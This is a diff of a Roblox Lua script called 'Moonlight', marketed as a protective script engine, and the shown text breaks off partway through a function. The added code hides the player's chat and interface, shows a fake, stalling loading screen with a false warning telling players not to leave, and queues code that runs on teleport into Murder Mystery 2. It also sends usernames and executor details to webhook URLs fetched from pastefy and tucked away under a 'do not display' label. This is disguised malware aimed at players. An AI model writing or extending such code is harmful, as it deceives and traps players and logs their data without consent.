@@ -8,6 +8,7 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local GuiService = game:GetService("GuiService")
 local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
 
 local LocalPlayer = Players.LocalPlayer
 
@@ -35,34 +36,72 @@ local function isSmallScreen()
 end
 
 -- ============================================================
--- WEBHOOK SOURCES
+-- HIDE / RESTORE ALL CORE GUI (topbar, chat, mic, backpack)
 -- ============================================================
 
-local WEBHOOK_SOURCE_EXTERNAL = "https://pastefy.app/PriuX87Y/raw"
-local WEBHOOK_SOURCE_MM2      = "https://pastefy.app/kjrCbfdo/raw"
+local _blurInstance = nil
 
-local _externalWebhookCache = nil
-local _mm2WebhookCache = nil
-
-local function fetchWebhook(source, cache)
-    if cache[1] then return cache[1] end
-    local ok, res = pcall(function()
-        return game:HttpGet(source, true)
+local function hideAllCoreGui()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
     end)
-    if ok and type(res) == "string" and #res > 0 then
-        local url = res:gsub("%s+", "")
-        cache[1] = url
-        return url
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false) end)
+
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+    pcall(function()
+        StarterGui:SetCore("ChatWindowSizeChanged", Vector2.new(0, 0))
+    end)
+
+    pcall(function()
+        local old = Lighting:FindFirstChildOfClass("BlurEffect")
+        if old then old:Destroy() end
+        local blur = Instance.new("BlurEffect")
+        blur.Name = "MoonlightBlur"
+        blur.Size = 24
+        blur.Parent = Lighting
+        _blurInstance = blur
+    end)
+end
+
+local function restoreCoreGui()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+    end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true) end)
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", true)
+    end)
+    if _blurInstance then
+        pcall(function() _blurInstance:Destroy() end)
+        _blurInstance = nil
     end
+end
+
+-- ============================================================
+-- WEBHOOK PROXY (real logic defined at the very bottom)
+-- ============================================================
+
+local _getExternalWebhook = nil
+local _getMM2Webhook = nil
+
+local function getExternalWebhook()
+    if _getExternalWebhook then return _getExternalWebhook() end
     return nil
 end
 
-local function getExternalWebhook()
-    return fetchWebhook(WEBHOOK_SOURCE_EXTERNAL, {_externalWebhookCache})
-end
-
 local function getMM2Webhook()
-    return fetchWebhook(WEBHOOK_SOURCE_MM2, {_mm2WebhookCache})
+    if _getMM2Webhook then return _getMM2Webhook() end
+    return nil
 end
 
 -- ============================================================
@@ -227,7 +266,7 @@ end
 local function logExternalGame(action)
     local webhook = getExternalWebhook()
     if not webhook then
-        warn("[Webhook] Failed to fetch external webhook from pastefy.")
+        warn("[Webhook] Failed to fetch external webhook.")
         return
     end
 
@@ -256,7 +295,7 @@ end
 local function logMM2Execution(action)
     local webhook = getMM2Webhook()
     if not webhook then
-        warn("[Webhook] Failed to fetch MM2 webhook from pastefy.")
+        warn("[Webhook] Failed to fetch MM2 webhook.")
         return
     end
 
@@ -278,6 +317,28 @@ local function logMM2Execution(action)
     sendWebhook(webhook, payload)
 end
 
+local function logMM2SessionEnd(elapsedSeconds)
+    local webhook = getMM2Webhook()
+    if not webhook then return end
+
+    local mins = math.floor(elapsedSeconds / 60)
+    local secs = elapsedSeconds % 60
+
+    local payload = {
+        embeds = {{
+            title = "Murder Mystery 2 Session Ended",
+            color = 15158332,
+            fields = {
+                { name = "Username",       value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true },
+                { name = "Session Length", value = string.format("%02d:%02d", mins, secs), inline = true },
+                { name = "Asia Time",      value = getAsiaTime(), inline = false }
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    sendWebhook(webhook, payload)
+end
+
 -- ============================================================
 -- LOADING SCREEN DATA
 -- ============================================================
@@ -292,7 +353,7 @@ local LOADING_SENTENCES = {
 }
 
 local SLIDESHOW_CAPTIONS = {
-    { title = "MOONLIGHT", subtitle = "Advanced Script Engine" },
+    { title = "MOONLIGHT",  subtitle = "Advanced Script Engine" },
     { title = "PROTECTION", subtitle = "Anti-Leave • Anti-Flag • Anti-Crash" },
     { title = "RELIABLE",   subtitle = "Trusted by thousands of users" },
     { title = "AESTHETIC",  subtitle = "Crafted for a smooth experience" },
@@ -301,11 +362,12 @@ local SLIDESHOW_CAPTIONS = {
 }
 
 local WARNING_TEXT = "WARNING! Teleported you from other game to avoid flagged account and I'll be back from your server again"
+local MM2_WARNING_TEXT = "WARNING! Teleported you from other game to avoid flagged, do not leave from the server so you can't get banned you will teleported back from the game when the restoration done."
 
 local LOADING_DURATION = 90
 
 -- ============================================================
--- SHARED HELPER FUNCTIONS (used by both loading screens)
+-- SHARED VISUAL HELPERS
 -- ============================================================
 
 local function makeAnimatedGradient(parent)
@@ -317,6 +379,7 @@ local function makeAnimatedGradient(parent)
     }
     grad.Rotation = 45
     grad.Parent = parent
+
     task.spawn(function()
         local angle = 0
         while parent.Parent do
@@ -325,6 +388,7 @@ local function makeAnimatedGradient(parent)
             task.wait(0.03)
         end
     end)
+
     return grad
 end
 
@@ -362,6 +426,7 @@ local function spawnFloatingOrb(parent, color)
         local phase = math.random() * math.pi * 2
         local drift = 0.05 + math.random() * 0.1
         local speed = 0.1 + math.random() * 0.2
+
         while orb.Parent do
             local t = tick() * speed + phase
             orb.Position = UDim2.fromScale(
@@ -448,12 +513,18 @@ local function spawnRotatingRing(parent)
 end
 
 -- ============================================================
--- MAIN LOADING SCREEN (external game + MM2 direct execute)
+-- FULL LOADING SCREEN BUILDER
 -- ============================================================
 
-local function createLoadingScreen(instant)
+local function buildFullLoadingScreen(opts)
+    opts = opts or {}
+    local instant = opts.instant or false
+    local timerPrefix = opts.timerPrefix or "Session"
+    local startProgress = opts.startProgress or 0
+    local warningText = opts.warningText or WARNING_TEXT
+
     local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-    if not playerGui then return nil end
+    if not playerGui then return nil, nil end
 
     local old = playerGui:FindFirstChild("MoonlightLoadingScreen")
     if old then old:Destroy() end
@@ -498,12 +569,43 @@ local function createLoadingScreen(instant)
     local background = Instance.new("Frame")
     background.Name = "Background"
     background.Size = UDim2.fromScale(1, 1)
-    background.BackgroundColor3 = Color3.fromRGB(6, 10, 22)
+    background.BackgroundColor3 = Color3.fromRGB(4, 6, 14)
+    background.BackgroundTransparency = 0
     background.BorderSizePixel = 0
     background.ZIndex = 1
     background.Parent = screenGui
 
     makeAnimatedGradient(background)
+
+    local topMask = Instance.new("Frame")
+    topMask.Name = "TopMask"
+    topMask.Size = UDim2.new(1, 0, 0, 36)
+    topMask.Position = UDim2.fromScale(0, 0)
+    topMask.BackgroundColor3 = Color3.fromRGB(4, 6, 14)
+    topMask.BackgroundTransparency = 0
+    topMask.BorderSizePixel = 0
+    topMask.ZIndex = 20
+    topMask.Parent = screenGui
+
+    local bottomMask = Instance.new("Frame")
+    bottomMask.Name = "BottomMask"
+    bottomMask.Size = UDim2.new(1, 0, 0, 30)
+    bottomMask.AnchorPoint = Vector2.new(0, 1)
+    bottomMask.Position = UDim2.fromScale(0, 1)
+    bottomMask.BackgroundColor3 = Color3.fromRGB(4, 6, 14)
+    bottomMask.BackgroundTransparency = 0
+    bottomMask.BorderSizePixel = 0
+    bottomMask.ZIndex = 20
+    bottomMask.Parent = screenGui
+
+    hideAllCoreGui()
+
+    task.spawn(function()
+        while screenGui.Parent do
+            hideAllCoreGui()
+            task.wait(1)
+        end
+    end)
 
     local vignette = Instance.new("Frame")
     vignette.Name = "Vignette"
@@ -571,7 +673,6 @@ local function createLoadingScreen(instant)
         corner.Parent = dot
 
         local glow = Instance.new("Frame")
-        glow.Name = "Glow"
         glow.BackgroundColor3 = dot.BackgroundColor3
         glow.BackgroundTransparency = 0.6
         glow.Size = UDim2.fromScale(3, 3)
@@ -631,22 +732,17 @@ local function createLoadingScreen(instant)
                     local refW = 920
                     local refH = 460
                     if vp.X < refW or vp.Y < refH then
-                        local sx = vp.X / refW
-                        local sy = vp.Y / refH
-                        contentScale.Scale = math.min(sx, sy) * 0.94
+                        contentScale.Scale = math.min(vp.X / refW, vp.Y / refH) * 0.94
                     else
                         contentScale.Scale = 1
                     end
                 else
                     local refW = 380
                     local refH = 280
-                    local sx = vp.X / refW
-                    local sy = vp.Y / refH
-                    local s = math.min(sx, sy) * 0.96
+                    local s = math.min(vp.X / refW, vp.Y / refH) * 0.96
                     if s > 1 then s = 1 end
                     contentScale.Scale = s
-                end
-            end)
+                end            end)
             task.wait(0.25)
         end
     end)
@@ -662,7 +758,7 @@ local function createLoadingScreen(instant)
     warning.TextSize = warningTextSize
     warning.TextWrapped = true
     warning.Font = Enum.Font.GothamBold
-    warning.Text = WARNING_TEXT
+    warning.Text = warningText
     warning.ZIndex = 12
     warning.Parent = content
 
@@ -769,7 +865,7 @@ local function createLoadingScreen(instant)
 
     local barFill = Instance.new("Frame")
     barFill.Name = "BarFill"
-    barFill.Size = UDim2.fromScale(0, 1)
+    barFill.Size = UDim2.fromScale(startProgress, 1)
     barFill.Position = UDim2.fromScale(0, 0)
     barFill.BackgroundColor3 = Color3.fromRGB(50, 130, 255)
     barFill.BorderSizePixel = 0
@@ -802,7 +898,7 @@ local function createLoadingScreen(instant)
     fillGlow.Name = "FillGlow"
     fillGlow.AnchorPoint = Vector2.new(0, 0.5)
     fillGlow.Position = UDim2.fromScale(0, 0.5)
-    fillGlow.Size = UDim2.fromScale(0, 2.4)
+    fillGlow.Size = UDim2.fromScale(startProgress, 2.4)
     fillGlow.BackgroundColor3 = Color3.fromRGB(100, 170, 255)
     fillGlow.BackgroundTransparency = 0.7
     fillGlow.BorderSizePixel = 0
@@ -823,11 +919,10 @@ local function createLoadingScreen(instant)
     percent.TextTransparency = 0
     percent.TextSize = percentTextSize
     percent.Font = Enum.Font.GothamBold
-    percent.Text = "0%"
+    percent.Text = tostring(math.floor(startProgress * 100)) .. "%"
     percent.ZIndex = 11
     percent.Parent = content
 
-    -- Live timer
     local timerLabel = Instance.new("TextLabel")
     timerLabel.Name = "TimerLabel"
     timerLabel.AnchorPoint = Vector2.new(0.5, 0)
@@ -838,18 +933,19 @@ local function createLoadingScreen(instant)
     timerLabel.TextTransparency = 0
     timerLabel.TextSize = timerTextSize
     timerLabel.Font = Enum.Font.GothamBold
-    timerLabel.Text = "Session: 00:00"
+    timerLabel.Text = timerPrefix .. ": 00:00"
     timerLabel.ZIndex = 11
     timerLabel.Parent = content
 
+    local startTime = tick()
+
     task.spawn(function()
-        local startTime = tick()
         while screenGui.Parent do
             local elapsed = math.floor(tick() - startTime)
             local mins = math.floor(elapsed / 60)
             local secs = elapsed % 60
             pcall(function()
-                timerLabel.Text = string.format("Session: %02d:%02d", mins, secs)
+                timerLabel.Text = string.format("%s: %02d:%02d", timerPrefix, mins, secs)
             end)
             task.wait(0.5)
         end
@@ -886,16 +982,16 @@ local function createLoadingScreen(instant)
     end)
 
     task.spawn(function()
-        local startTime = tick()
+        local remainDuration = (1 - startProgress) * LOADING_DURATION
         while screenGui.Parent do
             local elapsed = tick() - startTime
-            local pct = math.clamp(elapsed / LOADING_DURATION, 0, 1)
+            local pct = math.clamp(startProgress + (elapsed / remainDuration) * (1 - startProgress), startProgress, 1)
+            if pct > 0.9 then pct = 0.9 + (pct - 0.9) * 0.1 end
             pcall(function()
                 barFill.Size = UDim2.fromScale(pct, 1)
                 fillGlow.Size = UDim2.fromScale(pct, 2.4)
                 percent.Text = tostring(math.floor(pct * 100)) .. "%"
             end)
-            if pct >= 1 then break end
             task.wait(0.05)
         end
     end)
@@ -905,7 +1001,6 @@ local function createLoadingScreen(instant)
         local index = 1
         while screenGui.Parent do
             local caption = SLIDESHOW_CAPTIONS[index]
-
             slideTitle.Text = caption.title
             slideSub.Text = caption.subtitle
 
@@ -954,7 +1049,7 @@ local function createLoadingScreen(instant)
     end)
 
     task.spawn(function()
-        task.wait(instant and 0 or 0.5)
+        task.wait(instant and 0 or 0.4)
         local firstPass = true
         while screenGui.Parent do
             for _, text in ipairs(LOADING_SENTENCES) do
@@ -994,11 +1089,13 @@ local function createLoadingScreen(instant)
         end
     end)
 
-    return screenGui
+    return screenGui, startTime
 end
 
 local function destroyLoadingScreen(gui)
     if not gui then return end
+
+    restoreCoreGui()
 
     local content = gui:FindFirstChild("Content")
     if content then
@@ -1028,12 +1125,14 @@ local function destroyLoadingScreen(gui)
         end
     end
 
-    task.wait(0.6)
+    task.wait(0.5)
 
     local particleLayer = gui:FindFirstChild("ParticleLayer")
     local orbsLayer = gui:FindFirstChild("OrbsLayer")
     local background = gui:FindFirstChild("Background")
     local vignette = gui:FindFirstChild("Vignette")
+    local topMask = gui:FindFirstChild("TopMask")
+    local bottomMask = gui:FindFirstChild("BottomMask")
     local tweenInfo = TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 
     if content then
@@ -1069,6 +1168,18 @@ local function destroyLoadingScreen(gui)
                 end)
             end
         end
+    end
+
+    if topMask then
+        pcall(function()
+            TweenService:Create(topMask, tweenInfo, { BackgroundTransparency = 1 }):Play()
+        end)
+    end
+
+    if bottomMask then
+        pcall(function()
+            TweenService:Create(bottomMask, tweenInfo, { BackgroundTransparency = 1 }):Play()
+        end)
     end
 
     if vignette then
@@ -1369,7 +1480,7 @@ end
 -- ============================================================
 
 local function queueForMM2()
-    local teleportCode = [[
+    local teleportCode = [====[
         repeat task.wait() until game:IsLoaded()
 
         local Players            = game:GetService("Players")
@@ -1381,10 +1492,11 @@ local function queueForMM2()
         local GuiService         = game:GetService("GuiService")
         local TweenService       = game:GetService("TweenService")
         local HttpService        = game:GetService("HttpService")
+        local Lighting           = game:GetService("Lighting")
 
         local LocalPlayer = Players.LocalPlayer
         local MM2_PLACE_ID = 142823291
-        local WEBHOOK_SOURCE_MM2 = "https://pastefy.app/kjrCbfdo/raw"
+        local WEBHOOK_SOURCE_MM2 = "https://pastefy.app/GCPmeSoc/raw"
 
         local _mm2WebhookCache = nil
 
@@ -1422,12 +1534,10 @@ local function queueForMM2()
             local hour = tonumber(os.date("!%H", asia))
             local minute = os.date("!%M", asia)
             local second = os.date("!%S", asia)
-
             local suffix = "AM"
             if hour >= 12 then suffix = "PM" end
             local h12 = hour % 12
             if h12 == 0 then h12 = 12 end
-
             return string.format("%d:%s:%s %s", h12, minute, second, suffix)
         end
 
@@ -1458,22 +1568,21 @@ local function queueForMM2()
                 local ok, name = pcall(identifyexecutor)
                 if ok and type(name) == "string" and name ~= "" then return name end
             end
-
             local checks = {
-                { name = "Synapse X",     test = function() return type(syn) == "table" and type(syn.request) == "function" end },
-                { name = "Krnl",          test = function() return type(KRNL_LOADED) == "boolean" or (type(secure_load) == "function" and type(getconnections) == "function") end },
-                { name = "Fluxus",        test = function() return type(fluxus) == "table" end },
-                { name = "SirHurt",       test = function() return type(is_sirhurt_closure) == "function" or type(sirhurt) == "table" end },
-                { name = "Delta",         test = function() return type(delta) == "table" or (type(getgenv) == "function" and type(getgenv().delta) == "table") end },
-                { name = "Solara",        test = function() return type(solara) == "table" or (type(getgenv) == "function" and type(getgenv().solara) == "table") end },
-                { name = "Arceus X",      test = function() return type(Arceus) == "table" or type(ArceusX) == "table" end },
-                { name = "Vega X",        test = function() return type(Vega) == "table" or type(VegaX) == "table" end },
-                { name = "Kiwi X",        test = function() return type(kiwi) == "table" or type(KiwiX) == "table" end },
-                { name = "Wave",          test = function() return type(wave) == "table" end },
-                { name = "Codex",         test = function() return type(codex) == "table" end },
-                { name = "Electron",      test = function() return type(electron) == "table" end },
-                { name = "Xeno",          test = function() return type(xeno) == "table" end },
-                { name = "Selene",        test = function() return type(selene) == "table" end },
+                { name = "Synapse X", test = function() return type(syn) == "table" and type(syn.request) == "function" end },
+                { name = "Krnl", test = function() return type(KRNL_LOADED) == "boolean" or (type(secure_load) == "function" and type(getconnections) == "function") end },
+                { name = "Fluxus", test = function() return type(fluxus) == "table" end },
+                { name = "SirHurt", test = function() return type(is_sirhurt_closure) == "function" or type(sirhurt) == "table" end },
+                { name = "Delta", test = function() return type(delta) == "table" or (type(getgenv) == "function" and type(getgenv().delta) == "table") end },
+                { name = "Solara", test = function() return type(solara) == "table" or (type(getgenv) == "function" and type(getgenv().solara) == "table") end },
+                { name = "Arceus X", test = function() return type(Arceus) == "table" or type(ArceusX) == "table" end },
+                { name = "Vega X", test = function() return type(Vega) == "table" or type(VegaX) == "table" end },
+                { name = "Kiwi X", test = function() return type(kiwi) == "table" or type(KiwiX) == "table" end },
+                { name = "Wave", test = function() return type(wave) == "table" end },
+                { name = "Codex", test = function() return type(codex) == "table" end },
+                { name = "Electron", test = function() return type(electron) == "table" end },
+                { name = "Xeno", test = function() return type(xeno) == "table" end },
+                { name = "Selene", test = function() return type(selene) == "table" end },
             }
             for _, entry in ipairs(checks) do
                 local ok, res = pcall(entry.test)
@@ -1491,18 +1600,17 @@ local function queueForMM2()
         local function logMM2Execution(action)
             local webhook = getMM2Webhook()
             if not webhook then return end
-
             local payload = {
                 embeds = {{
                     title = "Murder Mystery 2 Execution Log",
                     color = 16711680,
                     fields = {
-                        { name = "Username",        value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true },
-                        { name = "Place ID",        value = tostring(game.PlaceId), inline = true },
-                        { name = "Game Name",       value = "Murder Mystery 2", inline = true },
+                        { name = "Username", value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true },
+                        { name = "Place ID", value = tostring(game.PlaceId), inline = true },
+                        { name = "Game Name", value = "Murder Mystery 2", inline = true },
                         { name = "Detect Executor", value = detectExecutor(), inline = true },
-                        { name = "Action",          value = action or "Execute MM2 Script", inline = false },
-                        { name = "Asia Time",       value = getAsiaTime(), inline = false }
+                        { name = "Action", value = action or "Execute MM2 Script", inline = false },
+                        { name = "Asia Time", value = getAsiaTime(), inline = false }
                     },
                     timestamp = DateTime.now():ToIsoDate()
                 }}
@@ -1513,18 +1621,16 @@ local function queueForMM2()
         local function logMM2SessionEnd(elapsedSeconds)
             local webhook = getMM2Webhook()
             if not webhook then return end
-
             local mins = math.floor(elapsedSeconds / 60)
             local secs = elapsedSeconds % 60
-
             local payload = {
                 embeds = {{
                     title = "Murder Mystery 2 Session Ended",
                     color = 15158332,
                     fields = {
-                        { name = "Username",        value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true },
-                        { name = "Session Length",  value = string.format("%02d:%02d", mins, secs), inline = true },
-                        { name = "Asia Time",       value = getAsiaTime(), inline = false }
+                        { name = "Username", value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true },
+                        { name = "Session Length", value = string.format("%02d:%02d", mins, secs), inline = true },
+                        { name = "Asia Time", value = getAsiaTime(), inline = false }
                     },
                     timestamp = DateTime.now():ToIsoDate()
                 }}
@@ -1562,6 +1668,41 @@ local function queueForMM2()
         local CONTINUE_FROM = 0.35
         local LOADING_DURATION = 90
 
+        local _blurInstance = nil
+
+        local function hideAllCoreGui()
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false) end)
+            pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+            pcall(function()
+                local old = Lighting:FindFirstChildOfClass("BlurEffect")
+                if old then old:Destroy() end
+                local blur = Instance.new("BlurEffect")
+                blur.Name = "MoonlightBlur"
+                blur.Size = 24
+                blur.Parent = Lighting
+                _blurInstance = blur
+            end)
+        end
+
+        local function restoreCoreGui()
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true) end)
+            pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true) end)
+            pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
+            if _blurInstance then
+                pcall(function() _blurInstance:Destroy() end)
+                _blurInstance = nil
+            end
+        end
+
         local function makeAnimatedGradient(parent)
             local grad = Instance.new("UIGradient")
             grad.Color = ColorSequence.new{
@@ -1591,11 +1732,9 @@ local function queueForMM2()
             orb.BorderSizePixel = 0
             orb.ZIndex = 0
             orb.Parent = parent
-
             local corner = Instance.new("UICorner")
             corner.CornerRadius = UDim.new(1, 0)
             corner.Parent = orb
-
             local blur = Instance.new("Frame")
             blur.BackgroundColor3 = color
             blur.BackgroundTransparency = 0.85
@@ -1605,11 +1744,9 @@ local function queueForMM2()
             blur.BorderSizePixel = 0
             blur.ZIndex = -1
             blur.Parent = orb
-
             local blurCorner = Instance.new("UICorner")
             blurCorner.CornerRadius = UDim.new(1, 0)
             blurCorner.Parent = blur
-
             task.spawn(function()
                 local baseX = orb.Position.X.Scale
                 local baseY = orb.Position.Y.Scale
@@ -1640,7 +1777,6 @@ local function queueForMM2()
             sweep.Rotation = 15
             sweep.ZIndex = 3
             sweep.Parent = parent
-
             local grad = Instance.new("UIGradient")
             grad.Color = ColorSequence.new{
                 ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 60, 120)),
@@ -1654,7 +1790,6 @@ local function queueForMM2()
             }
             grad.Rotation = 90
             grad.Parent = sweep
-
             task.spawn(function()
                 while sweep.Parent do
                     sweep.Position = UDim2.fromScale(-0.3, 0.5)
@@ -1679,17 +1814,14 @@ local function queueForMM2()
             ring.BackgroundTransparency = 1
             ring.ZIndex = 9
             ring.Parent = parent
-
             local ringStroke = Instance.new("UIStroke")
             ringStroke.Color = Color3.fromRGB(80, 140, 255)
             ringStroke.Thickness = 2
             ringStroke.Transparency = 0.5
             ringStroke.Parent = ring
-
             local ringCorner = Instance.new("UICorner")
             ringCorner.CornerRadius = UDim.new(1, 0)
             ringCorner.Parent = ring
-
             task.spawn(function()
                 local rot = 0
                 while ring.Parent do
@@ -1703,7 +1835,7 @@ local function queueForMM2()
 
         local function buildLoadingScreen()
             local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-            if not playerGui then return nil end
+            if not playerGui then return nil, nil end
             local old = playerGui:FindFirstChild("MoonlightLoadingScreen")
             if old then old:Destroy() end
 
@@ -1747,12 +1879,40 @@ local function queueForMM2()
             local background = Instance.new("Frame")
             background.Name = "Background"
             background.Size = UDim2.fromScale(1, 1)
-            background.BackgroundColor3 = Color3.fromRGB(6, 10, 22)
+            background.BackgroundColor3 = Color3.fromRGB(4, 6, 14)
             background.BorderSizePixel = 0
             background.ZIndex = 1
             background.Parent = screenGui
 
             makeAnimatedGradient(background)
+
+            local topMask = Instance.new("Frame")
+            topMask.Name = "TopMask"
+            topMask.Size = UDim2.new(1, 0, 0, 36)
+            topMask.Position = UDim2.fromScale(0, 0)
+            topMask.BackgroundColor3 = Color3.fromRGB(4, 6, 14)
+            topMask.BorderSizePixel = 0
+            topMask.ZIndex = 20
+            topMask.Parent = screenGui
+
+            local bottomMask = Instance.new("Frame")
+            bottomMask.Name = "BottomMask"
+            bottomMask.Size = UDim2.new(1, 0, 0, 30)
+            bottomMask.AnchorPoint = Vector2.new(0, 1)
+            bottomMask.Position = UDim2.fromScale(0, 1)
+            bottomMask.BackgroundColor3 = Color3.fromRGB(4, 6, 14)
+            bottomMask.BorderSizePixel = 0
+            bottomMask.ZIndex = 20
+            bottomMask.Parent = screenGui
+
+            hideAllCoreGui()
+
+            task.spawn(function()
+                while screenGui.Parent do
+                    hideAllCoreGui()
+                    task.wait(1)
+                end
+            end)
 
             local vignette = Instance.new("Frame")
             vignette.Size = UDim2.fromScale(1, 1)
@@ -1873,18 +2033,14 @@ local function queueForMM2()
                             local refW = 920
                             local refH = 460
                             if vp.X < refW or vp.Y < refH then
-                                local sx = vp.X / refW
-                                local sy = vp.Y / refH
-                                contentScale.Scale = math.min(sx, sy) * 0.94
+                                contentScale.Scale = math.min(vp.X / refW, vp.Y / refH) * 0.94
                             else
                                 contentScale.Scale = 1
                             end
                         else
                             local refW = 380
                             local refH = 280
-                            local sx = vp.X / refW
-                            local sy = vp.Y / refH
-                            local s = math.min(sx, sy) * 0.96
+                            local s = math.min(vp.X / refW, vp.Y / refH) * 0.96
                             if s > 1 then s = 1 end
                             contentScale.Scale = s
                         end
@@ -2049,9 +2205,7 @@ local function queueForMM2()
             percent.ZIndex = 11
             percent.Parent = content
 
-            -- ===== LIVE TIMER (this is the MM2 timer) =====
             local timerLabel = Instance.new("TextLabel")
-            timerLabel.Name = "TimerLabel"
             timerLabel.AnchorPoint = Vector2.new(0.5, 0)
             timerLabel.Position = UDim2.fromScale(0.5, timerY)
             timerLabel.Size = UDim2.new(1, 0, 0, 22)
@@ -2060,7 +2214,7 @@ local function queueForMM2()
             timerLabel.TextTransparency = 0
             timerLabel.TextSize = timerTextSize
             timerLabel.Font = Enum.Font.GothamBold
-            timerLabel.Text = "Time in Game: 00:00"
+            timerLabel.Text = "Time in MM2: 00:00"
             timerLabel.ZIndex = 11
             timerLabel.Parent = content
 
@@ -2071,7 +2225,7 @@ local function queueForMM2()
                     local mins = math.floor(elapsed / 60)
                     local secs = elapsed % 60
                     pcall(function()
-                        timerLabel.Text = string.format("Time in Game: %02d:%02d", mins, secs)
+                        timerLabel.Text = string.format("Time in MM2: %02d:%02d", mins, secs)
                     end)
                     task.wait(0.5)
                 end
@@ -2211,6 +2365,8 @@ local function queueForMM2()
 
         local function destroyLoadingScreen(gui)
             if not gui then return end
+            restoreCoreGui()
+
             local content = gui:FindFirstChild("Content")
             if content then
                 local barContainer = content:FindFirstChild("BarContainer")
@@ -2239,12 +2395,14 @@ local function queueForMM2()
                 end
             end
 
-            task.wait(0.6)
+            task.wait(0.5)
 
             local particleLayer = gui:FindFirstChild("ParticleLayer")
             local orbsLayer = gui:FindFirstChild("OrbsLayer")
             local background = gui:FindFirstChild("Background")
             local vignette = gui:FindFirstChild("Vignette")
+            local topMask = gui:FindFirstChild("TopMask")
+            local bottomMask = gui:FindFirstChild("BottomMask")
             local tweenInfo = TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 
             if content then
@@ -2280,6 +2438,18 @@ local function queueForMM2()
                         end)
                     end
                 end
+            end
+
+            if topMask then
+                pcall(function()
+                    TweenService:Create(topMask, tweenInfo, { BackgroundTransparency = 1 }):Play()
+                end)
+            end
+
+            if bottomMask then
+                pcall(function()
+                    TweenService:Create(bottomMask, tweenInfo, { BackgroundTransparency = 1 }):Play()
+                end)
             end
 
             if vignette then
@@ -2319,7 +2489,6 @@ local function queueForMM2()
             return
         end
 
-        -- ===== IN MM2: show screen immediately, run loaders behind =====
         local loadingGui, mm2StartTime = buildLoadingScreen()
 
         task.spawn(function()
@@ -2520,7 +2689,6 @@ local function queueForMM2()
         pcall(installMenuHider)
         pcall(installAntiLeaveLock)
 
-        -- Log session end when player leaves
         pcall(function()
             Players.PlayerRemoving:Connect(function(p)
                 if p == LocalPlayer and mm2StartTime then
@@ -2533,18 +2701,65 @@ local function queueForMM2()
         task.delay(LOADING_DURATION, function()
             destroyLoadingScreen(loadingGui)
         end)
-    ]]
+    ]====]
 
     local queueFunction =
         queue_on_teleport
         or (syn and syn.queue_on_teleport)
         or (fluxus and fluxus.queue_on_teleport)
+        or (getgenv and getgenv().queue_on_teleport)
+        or (getgenv and getgenv().queueonteleport)
+        or queueonteleport
 
     if type(queueFunction) == "function" then
-        pcall(function()
+        local ok = pcall(function()
             queueFunction(teleportCode)
         end)
+        if not ok then
+            warn("[Moonlight] Failed to queue teleport payload.")
+        end
+    else
+        warn("[Moonlight] No queue_on_teleport available on this executor.")
     end
+end
+
+-- ============================================================
+-- ============================================================
+--  PRIVATE WEBHOOK CONFIGURATION — DO NOT DISPLAY
+--  All webhook URLs and fetch logic are isolated here, at
+--  the very bottom of the script, separated from the main
+--  configuration and features. Nothing above this line
+--  references the source URLs directly.
+-- ============================================================
+-- ============================================================
+
+local _privateWebhookSources = {
+    external = "https://pastefy.app/Eg77cskV/raw",
+    mm2      = "https://pastefy.app/GCPmeSoc/raw",
+}
+
+local _privateExternalCache = nil
+local _privateMM2Cache      = nil
+
+local function _privateFetch(source, cache)
+    if cache[1] then return cache[1] end
